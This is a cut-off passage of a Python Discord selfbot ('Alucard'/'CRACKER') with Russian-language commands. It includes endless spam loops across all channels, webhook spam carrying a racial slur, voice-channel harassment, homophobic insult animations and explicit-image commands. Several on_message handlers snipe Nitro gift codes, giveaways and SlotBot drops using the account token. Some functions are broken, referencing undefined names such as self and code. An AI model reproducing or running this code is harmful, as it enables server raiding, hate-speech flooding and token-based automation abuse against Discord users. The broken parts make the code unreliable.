⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛

```""")
    await asyncio.sleep(1)
    await message.edit(content=" ")


@Alucard.command()
async def lags(ctx):
    while True:
        for channel in ctx.guild.text_channels:
            await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")


@ Alucard.command(aliases=['editspam2', 'massedit2'])
async def aboba(ctx, count=None):
    await ctx.message.delete()
    if count == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="CRACKER - Редактирование сообщений",
                              description=f"Вы не ввели кол-во сообщений.\n{prefix.strip()}Редактирование [кол-во]", color=randcolor)

        await ctx.send(embed=embed)
    else:
        edited=0
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(
            title="CRACKER", description=f"Редактирование прошло успешно.", color=randcolor)
        msg=await ctx.send(embed=embed)
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == Alucard.user:
                    if message != msg:
                        await message.edit(content=":a:" ":b:" ":o2:" ":b:" ":a:", embed=None)
                        edited=edited + 1
            except:
                pass


@Alucard.command()
async def fbi(ctx, *, user):
    await ctx.message.delete()
    msg=await ctx.send('> **knock knock**')
    await asyncio.sleep(2)
    await msg.edit(content='> **FBI OPEN UP**')
    await asyncio.sleep(2)
    reas=['fraud',
            'robbery',
            'murder',
            'unethical hacking',
            'drugs']
    await msg.edit(content=f'> {user} вы будете повязаны за {random.choices(reas)}')
    await asyncio.sleep(3)
    await msg.edit(content='> https://tenor.com/view/fbi-raid-swat-gif-11500735')


@ Alucard.command(aliases=["dum"])
async def gay(ctx, user="‌‌"):
    await ctx.message.delete()
    message=await ctx.send(f'Ты {user}')
    time.sleep(0.5)
    await message.edit(content='Ебаный')
    time.sleep(0.5)
    await message.edit(content=f'Гандон')
    time.sleep(0.5)
    await message.edit(content=f'Пидор {user}')
    time.sleep(1)
    await message.edit(content='Мать ебал')


@Alucard.command()
async def boom(ctx):
    list=(
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 5```",
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 4```",
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 3```",
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 2```",
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 1```",
        "```ЭТО СООБЩЕНИЕ ВЗОРВЁТСЯ ЧЕРЕЗ 0```",
        "💣",
        "💥",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)


@Alucard.command()
async def fleshka(ctx):
    await ctx.message.delete()
    await ctx.send("https://cdn.discordapp.com/attachments/839194547904053300/857732571998846986/image0.gif")


@Alucard.command()
async def voicespam(ctx, amount: int):
    await ctx.message.delete()
    try:

        clients=[]

        for channel in ctx.guild.voice_channels:
            for member in channel.members:
                clients.append(member)

        for _i in range(0, amount):
            try:
                le_task=[client.edit(voice_channel=random.choice(
                    ctx.guild.voice_channels)) for client in clients]
                await asyncio.wait(le_task)
            except:
                pass

    except Exception:
        pass


@Alucard.command()
async def animatenick(ctx, *, text):
    await ctx.message.delete()
    try:

        global animating
        animating=True
        while animating:
            name=""
            for letter in text:
                name=name + letter
                await ctx.message.author.edit(nick=name)
    except Exception:
        pass


@Alucard.command()
async def stopanimatenick(ctx):
    await ctx.message.delete()

    try:

        global animating
        animating=False
    except Exception:
        pass


@Alucard.command()
async def thanos(ctx):
    await ctx.message.delete()
    msg=await ctx.send('**ЩЁЛК**')
    await asyncio.sleep(1)
    await msg.edit(content='https://cdn.discordapp.com/attachments/839194547904053300/858828175102050304/War_1544187948.gif')
    await asyncio.sleep(1)
    await msg.edit(content="||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')
    await ctx.send("||" + '\n' * 1996 + '||')

'''
Команды взаимодействия.
'''


@Alucard.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/kiss")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Alucard_kiss.gif"))
    except:
        em=discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

    if user is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> поцеловал самого себя :3',
            color=0xff0000
        )

        await ctx.send(embed=nine)


@Alucard.command()
async def poke(ctx, member: discord.Member):
    await ctx.message.delete()
    embed=discord.Embed(
        description=f'<@{ctx.author.id}> тыкнул <@{member.id}>',
        color=0xff0000
    )
    embed.set_image(
        url='https://cdn.discordapp.com/attachments/862252476190294029/862656766017142797/1562906700190890888.gif')

    await ctx.send(embed=embed)

    if member is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> тыкнул самого себя :3',
            color=0xff0000
        )
        await ctx.send(embed=nine)


@Alucard.command()
async def sex(ctx, member: discord.Member):

    embed=discord.Embed(
        description=f'<@{ctx.author.id} занялся сексом с <@{member.id}>🥰🥰🥰',
        color=0xff0000
    )
    embed.set_image(
        url='https://cdn.discordapp.com/attachments/839194547904053300/862796516048764938/unnamed.gif')

    await ctx.send(embed=embed)

    if member is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> успешно подрочил!🍆',
            color=0xff0000
        )

        await ctx.send(embed=nine)


@Alucard.command()
async def pet(ctx, member: discord.Member):

    embed=discord.Embed(
        description=f'<@{ctx.author.id}> погладил <@{member.id}>',
        color=0xff0000
    )
    embed.set_image(
        url='https://cdn.discordapp.com/attachments/862252476190294029/862662602126917653/12809201926232383.gif')

    await ctx.send(embed=embed)

    if member is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> зачем-то погладил самого себя.',
            color=0xff0000
        )

        await ctx.send(embed=nine)


@Alucard.command()
async def hit(ctx, member: discord.Member):

    embed=discord.Embed(
        description=f'<@{ctx.author.id}> ударил <@{member.id}>.',
        color=0xff0000
    )
    embed.set_image(
        url='https://cdn.discordapp.com/attachments/862252476190294029/862665779433832468/tenor.gif')

    await ctx.send(embed=embed)

    if member is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> нанёс мощный удар дубинкой по лицу!',
            color=0xff0000
        )

        await ctx.send(embed=nine)


@Alucard.command()
async def kill(ctx, member: discord.Member):

    embed=discord.Embed(
        description=f'ШОК! <@{ctx.author.id}> убил <@{member.id}>!',
        color=0xff0000
    )
    await ctx.send(embed=embed)

    if member is None:

        nine=discord.Embed(
            description=f'<@{ctx.author.id}> совершил самоубийство!',
            color=0xff0000
        )

        await ctx.send(embed=nine)

'''
Команды хентая.
'''


@Alucard.command()
async def cum(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/cum")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_cumslut.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Alucard.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/les")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_lesbian.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Alucard.command()
async def spamh(ctx, *, hook):
    global fuck
    fuck=True
    while fuck:
        requests.post(hook, data={'content': "@everyone NIGGAS"})


@Alucard.command()
async def anal(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/anal")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_anal.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Alucard.command()
async def tits(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/tits")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_tits.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Alucard.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/blowjob")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_blowjob.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

'''
Команды модерации.
'''


@Alucard.command()
async def ban(ctx, member: discord.Member, *, reason="No reason given",):
    """ban someone, can also be used to ban someone not in the guild using their id
    Parameters
    • member - the member to ban
    • reason - reason why the member was banned
    """
    if type(member) == discord.Member:
        await ctx.guild.ban(member, reason=reason, delete_message_days=0)
    else:
        await ctx.guild.ban(
            discord.Object(member), reason=reason, delete_message_days=0
        )
    emb=await self.format_mod_embed(ctx, member, True, "ban")
    await ctx.send(embed=emb)


@Alucard.command()
async def kick(ctx, member: discord.Member, *, reason="No reason given"):
    """kick someone
    Parameters
    • member - the member to kick
    • reason - reason why the member was kicked
    """
    self.saved_roles[member.id]=member.roles[1:]
    try:
        await ctx.guild.kick(member, reason=reason)
    except:
        success=False
    else:
        success=True

    emb=await self.format_mod_embed(ctx, member, success, "kick")

    await ctx.send(embed=emb)


'''
Команды текста.
'''


@Alucard.command()
async def vape(ctx, *, text: str):
    await ctx.message.delete()
    message=''
    for c in text:
        message += c.upper() + " "

    await ctx.send(message)


@Alucard.command()
async def animate(ctx, *, text):
    await ctx.message.delete()
    try:
        message=f'{text[0]}'
        msg=await ctx.send(message)
        for c in text[1:]:
            message += c
            await msg.edit(content=message)
            await asyncio.sleep(0.5)
    except Exception:
        return


@Alucard.command()
async def reverse(ctx, *, text: str):
    await ctx.message.delete()

    await ctx.send(''.join(reversed(text)))


@Alucard.command()
async def emojitext(ctx, *, msg):
    """Convert text into emojis"""
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    if msg != None:
        out=msg.lower()
        text=out.replace(' ', '    ').replace('10', '\u200B:keycap_ten:')\
                  .replace('ab', '\u200B🆎').replace('cl', '\u200B🆑')\
                  .replace('0', '\u200B:zero:').replace('1', '\u200B:one:')\
                  .replace('2', '\u200B:two:').replace('3', '\u200B:three:')\
                  .replace('4', '\u200B:four:').replace('5', '\u200B:five:')\
                  .replace('6', '\u200B:six:').replace('7', '\u200B:seven:')\
                  .replace('8', '\u200B:eight:').replace('9', '\u200B:nine:')\
                  .replace('!', '\u200B❗').replace('?', '\u200B❓')\
                  .replace('vs', '\u200B🆚').replace('.', '\u200B🔸')\
                  .replace(',', '🔻').replace('a', '\u200B🅰')\
                  .replace('b', '\u200B🅱').replace('c', '\u200B🇨')\
                  .replace('d', '\u200B🇩').replace('e', '\u200B🇪')\
                  .replace('f', '\u200B🇫').replace('g', '\u200B🇬')\
                  .replace('h', '\u200B🇭').replace('i', '\u200B🇮')\
                  .replace('j', '\u200B🇯').replace('k', '\u200B🇰')\
                  .replace('l', '\u200B🇱').replace('m', '\u200B🇲')\
                  .replace('n', '\u200B🇳').replace('ñ', '\u200B🇳')\
                  .replace('o', '\u200B🅾').replace('p', '\u200B🅿')\
                  .replace('q', '\u200B🇶').replace('r', '\u200B🇷')\
                  .replace('s', '\u200B🇸').replace('t', '\u200B🇹')\
                  .replace('u', '\u200B🇺').replace('v', '\u200B🇻')\
                  .replace('w', '\u200B🇼').replace('x', '\u200B🇽')\
                  .replace('y', '\u200B🇾').replace('z', '\u200B🇿')
        try:
            await ctx.send(text)
        except Exception as e:
            await ctx.send(f'```{e}```')
    else:
        await ctx.send('Write something, reee!', delete_after=3.0)


@ Alucard.command(aliases=['editspam22', 'massedit22'])
async def destroy(ctx, count=None):
    await ctx.message.delete()
    if count == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="CRACKER - Самоуничтожение сообщений",
                              description=f"Вы не ввели кол-во сообщений.\n{prefix.strip()}Редактирование [кол-во]", color=randcolor)
        await ctx.send(embed=embed)
    else:
        edited=0
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(
            title="CRACKER - Самоуничтожение сообщений", description=f"Самоуничтожение началось...", color=randcolor)
        msg=await ctx.send(embed=embed)
        async for message in ctx.channel.history():
            if int(edited) < int(count) and message.author == Alucard.user and message != msg and message != ':boom:':
                try:
                    await message.edit(content='Самоуничтожение через 3', embed=None)
                    await asyncio.sleep(1)
                    await message.edit(content='Самоуничтожение через 2', embed=None)
                    await asyncio.sleep(1)
                    await message.edit(content='Самоуничтожение через 1', embed=None)
                    await asyncio.sleep(1)
                    await message.edit(content='💣', embed=None)
                    await asyncio.sleep(1)
                    await message.edit(content='💥', embed=None)
                    edited=edited + 1
                except:
                    pass
    randcolor=random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(
        title="CRACKER - Самоуничтожение сообщений", description=f"Самоуничтожение окончено. Уничтожил {edited} сообщений", color=randcolor)
    msg=await ctx.send(embed=embed)


@Alucard.command()
async def spoiler(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(f'||{text}||')


@Alucard.command()
async def spoiler1(ctx, *, text):
    await ctx.message.delete()
    name=""
    for letter in text:
        name=name + f'||{letter}||'
    await ctx.send(name)


@Alucard.command()
async def spoiler2(ctx, *, text):
    await ctx.message.delete()
    name=""
    for letter in text:
        if letter != " ":
            name=name + f'||{letter}||'
        elif letter == " ":
            name=name + f'{letter}'
    await ctx.send(name)


@ Alucard.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/pussy")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_pussy.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Alucard.command()
async def nro(ctx, *, lol: int):
    await ctx.message.delete()

    for i in range(lol):
        x=Nitro()
        token=config.get('token')

        headers={'Authorization': token}

        r=requests.post(
            f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
            headers=headers,
        ).text


@Alucard.command()
async def s(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(embed=discord.Embed(description=text, color=RandomColor()))


def zalgoText(string):
    result=''

    for char in string:
        for i in range(0, random.randint(20, 40)):
            randBytes=random.randint(0x300, 0x36f).to_bytes(2, 'big')
            char += randBytes.decode('utf-16be')
            i + 1
        result += char
    return result


@Alucard.command()
async def zalgo(ctx, *, text: str):
    await ctx.message.delete()

    await ctx.send(zalgoText(text))


'''
События.
'''


@Alucard.event
async def on_message_edit(before, after):
    await Alucard.process_commands(after)


@Alucard.event
async def on_message(message):

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    def PrivnoteData(code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
            + Fore.RESET)

    time=datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start=datetime.datetime.now()
            code=re.search("discord.gift/(.*)", message.content).group(1)
            token=config.get('token')

            headers={'Authorization': token}

            r=requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed=datetime.datetime.now() - start
            elapsed=f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Alucard.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
